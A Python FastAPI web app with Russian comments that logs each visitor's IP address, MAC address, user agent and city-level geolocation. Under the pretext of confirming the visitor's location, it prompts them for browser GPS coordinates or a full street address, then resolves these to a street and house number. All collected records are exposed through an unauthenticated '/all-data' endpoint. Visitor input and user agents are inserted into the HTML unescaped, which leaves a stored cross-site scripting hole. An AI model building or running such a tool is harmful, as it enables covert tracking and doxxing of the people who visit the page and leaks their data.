from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
import subprocess
import re
import socket
import requests
from datetime import datetime
from typing import Dict, List
import geocoder  # Библиотека для работы с геоданными

app = FastAPI()

# Хранилище данных
location_data: Dict[str, Dict] = {}


def get_mac(ip: str) -> str:
    """Получение MAC-адреса"""
    try:
        cmd = ["arp", "-n", ip] if subprocess.os.name != "nt" else ["arp", "-a", ip]
        output = subprocess.check_output(cmd).decode(errors="ignore")
        mac = re.search(r"(([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})", output)
        return mac.group(0) if mac else "Неизвестно"
    except Exception as e:
        return f"Ошибка: {str(e)}"


def get_location_by_coords(lat: float, lon: float) -> Dict:
    """Определение адреса по координатам"""
    try:
        g = geocoder.osm([lat, lon], method='reverse')
        return {
            "address": g.address,
            "street": g.street,
            "house_number": g.housenumber,
            "city": g.city,
            "country": g.country,
            "postal": g.postal,
            "full": g.json.get("raw", {}).get("address")
        }
    except Exception as e:
        return {"error": str(e)}


def get_approximate_location(ip: str) -> Dict:
    """Получение приблизительного местоположения"""
    # Для публичных IP
    if not ip.startswith(('10.', '192.168.', '172.')):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon,query")
            data = response.json()
            if data["status"] == "success":
                return {
                    **data,
                    "type": "ip_geolocation",
                    "address": f"{data.get('city')}, {data.get('country')}",
                    "accuracy": "Город/регион"
                }
        except:
            pass

    return {
        "status": "Требуется уточнение",
        "accuracy": "Неизвестно",
        "type": "local_ip"
    }


@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    """Главная страница с определением местоположения"""
    client_ip = request.client.host

    if client_ip not in location_data:
        location_data[client_ip] = {
            "ip": client_ip,
            "mac": get_mac(client_ip),
            "location": get_approximate_location(client_ip),
            "user_agent": request.headers.get("user-agent"),
            "timestamp": datetime.now().isoformat(),
            "coordinates": None,
            "exact_address": None
        }

    data = location_data[client_ip]

    # Если есть координаты, но нет точного адреса
    if data.get("coordinates") and not data.get("exact_address"):
        exact_location = get_location_by_coords(*data["coordinates"])
        if exact_location.get("address"):
            data["exact_address"] = exact_location
            data["location"]["accuracy"] = "Точный адрес"

    # Страница с запросом геолокации
    if data["location"]["status"] == "Требуется уточнение":
        return HTMLResponse(f"""
        <html>
        <head>
            <title>Подтверждение местоположения</title>
            <script>
            function getLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(
                        function(position) {{
                            document.getElementById("lat").value = position.coords.latitude;
                            document.getElementById("lon").value = position.coords.longitude;
                            document.getElementById("locForm").submit();
                        }},
                        function(error) {{
                            alert("Ошибка получения геоданных: " + error.message);
                        }}
                    );
                }} else {{
                    alert("Геолокация не поддерживается вашим браузером");
                }}
            }}
            </script>
        </head>
        <body style="font-family: Arial; padding: 20px;">
            <h2>🔍 Точное определение местоположения</h2>

            <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px;">
                <p>Ваше текущее определенное местоположение:</p>
                <p><strong>{data['location'].get('address', 'Неизвестно')}</strong></p>
                <p>Точность: {data['location'].get('accuracy', 'Низкая')}</p>
            </div>

            <div style="border: 1px solid #ccc; padding: 15px; border-radius: 5px;">
                <h3>Способы уточнения:</h3>

                <div style="margin-bottom: 15px;">
                    <h4>1. Автоматическое определение (рекомендуется)</h4>
                    <button onclick="getLocation()" style="padding: 8px 15px;">
                        📍 Определить по GPS/геолокации
                    </button>
                    <form id="locForm" action="/set-coords" method="post" style="display: none;">
                        <input type="hidden" id="lat" name="lat">
                        <input type="hidden" id="lon" name="lon">
                        <input type="hidden" name="ip" value="{client_ip}">
                    </form>
                </div>

                <div>
                    <h4>2. Ввести адрес вручную</h4>
                    <form action="/set-address" method="post">
                        <input type="hidden" name="ip" value="{client_ip}">
                        <label>Полный адрес:</label><br>
                        <input type="text" name="address" required style="width: 300px; padding: 8px;"><br>
                        <button type="submit" style="margin-top: 10px; padding: 8px 15px;">
                            Сохранить адрес
                        </button>
                    </form>
                </div>
            </div>
        </body>
        </html>
        """)

    # Страница с результатами
    return HTMLResponse(f"""
    <html>
    <head>
        <title>Ваше местоположение</title>
        <style>
            .map {{
                height: 300px;
                background: #eee;
                border: 1px solid #ccc;
                margin: 20px 0;
                display: flex;
                align-items: center;
                justify-content: center;
            }}
        </style>
    </head>
    <body style="font-family: Arial; padding: 20px;">
        <h1>🌍 Ваше точное местоположение</h1>

        <div style="background: #e8f5e9; padding: 20px; border-radius: 8px;">
            <h2>📍 {data['exact_address'].get('address') if data.get('exact_address') else data['location'].get('address', 'Неизвестно')}</h2>

            {f"<p><strong>Координаты:</strong> {data['coordinates'][0]}, {data['coordinates'][1]}</p>" if data.get('coordinates') else ""}

            {f"<div class='map'><a href='https://www.openstreetmap.org/?mlat={data['coordinates'][0]}&mlon={data['coordinates'][1]}&zoom=16' target='_blank'>Посмотреть на карте</a></div>" if data.get('coordinates') else ""}

            <div style="margin-top: 20px;">
                <h3>Детали адреса:</h3>
                <ul>
                    {f"<li><strong>Улица:</strong> {data['exact_address'].get('street')}" if data.get('exact_address') and data['exact_address'].get('street') else ""}
                    {f"<li><strong>Дом:</strong> {data['exact_address'].get('house_number')}" if data.get('exact_address') and data['exact_address'].get('house_number') else ""}
                    <li><strong>Город:</strong> {data['exact_address'].get('city') if data.get('exact_address') else data['location'].get('city', 'Неизвестно')}</li>
                    <li><strong>Страна:</strong> {data['exact_address'].get('country') if data.get('exact_address') else data['location'].get('country', 'Неизвестно')}</li>
                </ul>
            </div>
        </div>

        <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin-top: 20px;">
            <h3>Техническая информация:</h3>
            <ul>
                <li><strong>IP:</strong> {data['ip']}</li>
                <li><strong>MAC:</strong> {data['mac']}</li>
                <li><strong>Устройство:</strong> {data['user_agent']}</li>
                <li><strong>Время определения:</strong> {datetime.fromisoformat(data['timestamp']).strftime('%d.%m.%Y %H:%M')}</li>
                <li><strong>Точность:</strong> {data['location'].get('accuracy', 'Неизвестно')}</li>
            </ul>
        </div>
    </body>
    </html>
    """)


@app.post("/set-coords")
async def set_coordinates(ip: str = Form(...), lat: float = Form(...), lon: float = Form(...)):
    """Сохранение координат из геолокации браузера"""
    if ip in location_data:
        location_data[ip]["coordinates"] = (lat, lon)
        exact_location = get_location_by_coords(lat, lon)
        if exact_location.get("address"):
            location_data[ip]["exact_address"] = exact_location
            location_data[ip]["location"]["accuracy"] = "Точный адрес (GPS)"
    return RedirectResponse(url="/", status_code=303)


@app.post("/set-address")
async def set_address(ip: str = Form(...), address: str = Form(...)):
    """Сохранение адреса вручную"""
    if ip in location_data:
        location_data[ip]["exact_address"] = {"address": address}
        location_data[ip]["location"]["accuracy"] = "Ручной ввод"
    return RedirectResponse(url="/", status_code=303)


@app.get("/all-data")
async def get_all_data():
    """Получение всех собранных данных (для администратора)"""
    return location_data


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)